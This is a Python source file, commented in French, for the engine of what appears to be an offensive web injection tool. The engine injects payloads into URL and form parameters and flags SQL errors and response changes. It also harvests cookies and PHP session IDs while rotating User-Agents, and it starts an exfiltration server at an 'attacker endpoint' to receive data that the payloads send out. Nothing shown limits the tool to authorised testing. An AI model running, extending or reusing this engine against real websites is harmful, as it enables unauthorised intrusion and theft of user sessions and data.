#!/usr/bin/env python3
"""
🎯 Moteur principal — Générique + gestion IP attaquant intégrée
Intègre tes techniques de scan_forms.py, scan_get_vuln.py, etc.
"""

import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style
from utils.network import detect_attacker_endpoint
from core.exfil import ExfilServer

class InjectionEngine:
    def __init__(self, target_url, attacker_url=None, port=8888, aggressive=False, stealth=False):
        self.url = target_url
        self.stealth = stealth
        self.port = port
        self.aggressive = aggressive
        self.session = requests.Session()
        self.all_cookies = {}  # Stocker TOUS les cookies détectés
        self.session_variations = []  # Stocker les variations de sessions
        
        # Endpoint attaquant (seulement si pas mode furtif)
        if stealth:
            self.attacker_url = None
        else:
            self.attacker_url = attacker_url or detect_attacker_endpoint(port)
        
        # Rotation agressive des User-Agents
        self.session.headers.update({
            'User-Agent': self._get_random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        self.baseline_resp = None
        
        # Serveur d'exfiltration (seulement si pas mode furtif)
        if not stealth:
            self.exfil_server = ExfilServer(port)
            self.exfil_server.start()
            print(f"\n{Fore.CYAN}[ENGINE] {Style.RESET_ALL}Cible: {Fore.GREEN}{target_url}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[ENGINE] {Style.RESET_ALL}Endpoint attaquant: {Fore.YELLOW}{self.attacker_url}{Style.RESET_ALL}")
        else:
            self.exfil_server = None
            print(f"\n{Fore.CYAN}[ENGINE] {Style.RESET_ALL}Cible: {Fore.GREEN}{target_url}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[ENGINE] {Style.RESET_ALL}Mode furtif - Pas d'exfiltration")
        
        # Scan agressif initial des cookies et sessions
        if self.aggressive:
            self._aggressive_cookie_discovery()
    
    def _get_random_ua(self):
        """Rotation d'User-Agents (inspiré de tes scripts)"""
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B)'
        ]
        import random
        return random.choice(uas)
    
    def get_baseline(self):
        """Obtenir réponse de référence"""
        if not self.baseline_resp:
            self.baseline_resp = self.session.get(self.url, timeout=30)
        return self.baseline_resp
    
    def discover_params(self):
        """Découvrir paramètres dans l'URL (inspiré de scan_get_vuln.py)"""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        return list(params.keys()) if params else []
    
    def discover_form_params(self):
        """Découvrir paramètres dans les formulaires (inspiré de scan_forms.py)"""
        from bs4 import BeautifulSoup
        try:
            resp = self.session.get(self.url, timeout=30)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            params = []
            for form in forms:
                inputs = form.find_all(['input', 'textarea', 'select'])
                for inp in inputs:
                    if inp.get('name'):
                        params.append(inp.get('name'))
            return list(set(params))
        except:
            return []
    
    def build_url(self, param, payload):
        """Construire URL avec payload injecté"""
        parsed = urlparse(self.url)
        query_params = parse_qs(parsed.query)
        
        if param not in query_params:
            query_params[param] = ['test']
        
        query_params[param] = [payload]
        new_query = urlencode(query_params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def analyze_response(self, baseline, injected_resp, payload_type):
        """Analyse comportementale générique (améliorée de scan_get_vuln.py)"""
        # Différence de contenu
        if self._content_differs(baseline.text, injected_resp.text):
            return True, f"Contenu différent après injection '{payload_type}'"
        
        # Erreurs génériques
        error_keywords = ['sql syntax', 'unclosed quotation', 'quoted string', 
                         'warning', 'error', 'mysql', 'postgresql', 'oracle',
                         'syntax error', 'mysql_fetch', 'pg_query', 'ora-']
        if any(kw in injected_resp.text.lower() for kw in error_keywords):
            return True, "Erreur de base de données détectée"
        
        # Changement de statut HTTP significatif
        if injected_resp.status_code != baseline.status_code:
            if baseline.status_code == 200 and injected_resp.status_code in [500, 404]:
                return True, f"Changement de statut: {baseline.status_code} → {injected_resp.status_code}"
        
        return False, "Aucune anomalie détectée"
    
    def _content_differs(self, text1, text2):
        """Détection de différence significative"""
        t1 = text1[:500].lower().replace(' ', '').replace('\n', '')
        t2 = text2[:500].lower().replace(' ', '').replace('\n', '')
        
        min_len = min(len(t1), len(t2))
        if min_len == 0:
            return False
        
        diff_count = sum(1 for i in range(min_len) if t1[i] != t2[i])
        return (diff_count / min_len) > 0.3
    
    def get_attacker_url(self):
        """Retourne l'URL de l'attaquant pour les payloads"""
        return self.attacker_url
    
    def _aggressive_cookie_discovery(self):
        """Découverte agressive de cookies et sessions - Mode ULTRA"""
        print(f"{Fore.YELLOW}[ENGINE] {Style.RESET_ALL}🍪 Découverte agressive de cookies...")
        
        # Stratégies multiples pour maximiser la détection
        strategies = [
            {'headers': {}, 'name': 'Standard'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, 'name': 'Windows Chrome'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'}, 'name': 'Mac Safari'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'}, 'name': 'Linux Firefox'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)'}, 'name': 'iPhone Safari'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (Android 11; Mobile)'}, 'name': 'Android Chrome'},
            {'headers': {'Referer': self.url}, 'name': 'With Referer'},
            {'headers': {'Origin': self.url}, 'name': 'With Origin'},
        ]
        
        for i, strategy in enumerate(strategies):
            try:
                # Créer une nouvelle session pour chaque stratégie
                temp_session = requests.Session()
                temp_session.headers.update(strategy['headers'])
                
                # Faire la requête
                resp = temp_session.get(self.url, timeout=5)
                
                # Analyser Set-Cookie headers
                set_cookie_headers = resp.headers.get('Set-Cookie')
                if set_cookie_headers:
                    cookies_parts = set_cookie_headers.split(';')
                    if cookies_parts:
                        name_value = cookies_parts[0].strip()
                        if '=' in name_value:
                            name, value = name_value.split('=', 1)
                            cookie_key = f"{name}_{value[:20]}_{strategy['name']}"
                            if cookie_key not in self.all_cookies:
                                self.all_cookies[cookie_key] = {
                                    'name': name,
                                    'value': value,
                                    'strategy': strategy['name'],
                                    'attributes': cookies_parts[1:]
                                }
                
                # Analyser cookies de session
                for cookie in temp_session.cookies:
                    cookie_key = f"session_{cookie.name}_{str(cookie.value)[:20]}_{strategy['name']}"
                    if cookie_key not in self.all_cookies:
                        self.all_cookies[cookie_key] = {
                            'name': cookie.name,
                            'value': str(cookie.value),
                            'strategy': strategy['name'],
                            'type': 'session',
                            'domain': cookie.domain,
                            'path': cookie.path,
                            'secure': cookie.secure,
                            'expires': cookie.expires
                        }
                
                # Détecter les variations de session
                if 'PHPSESSID' in [c.name for c in temp_session.cookies]:
                    phpsessid = [c for c in temp_session.cookies if c.name == 'PHPSESSID'][0]
                    session_info = {
                        'session_id': phpsessid.value,
                        'strategy': strategy['name'],
                        'timestamp': time.time(),
                        'user_agent': strategy['headers'].get('User-Agent', 'Default')
                    }
                    self.session_variations.append(session_info)
                
            except Exception as e:
                continue
        
        # Afficher les résultats
        if self.all_cookies:
            print(f"{Fore.GREEN}[+] {Style.RESET_ALL}🍪 {len(self.all_cookies)} cookies uniques découverts")
            unique_sessions = len(set(v['session_id'] for v in self.session_variations if 'session_id' in v))
            if unique_sessions > 1:
                print(f"{Fore.GREEN}[+] {Style.RESET_ALL}🔄 {unique_sessions} sessions PHP différentes détectées")
        else:
            print(f"{Fore.YELLOW}[!] {Style.RESET_ALL}Aucun cookie découvert")
    
    def get_all_cookies(self):
        """Retourner tous les cookies découverts"""
        return self.all_cookies
    
    def get_session_variations(self):
        """Retourner les variations de sessions"""
        return self.session_variations
    
    def stop(self):
        """Arrêter proprement"""
        if self.exfil_server:
            self.exfil_server.stop()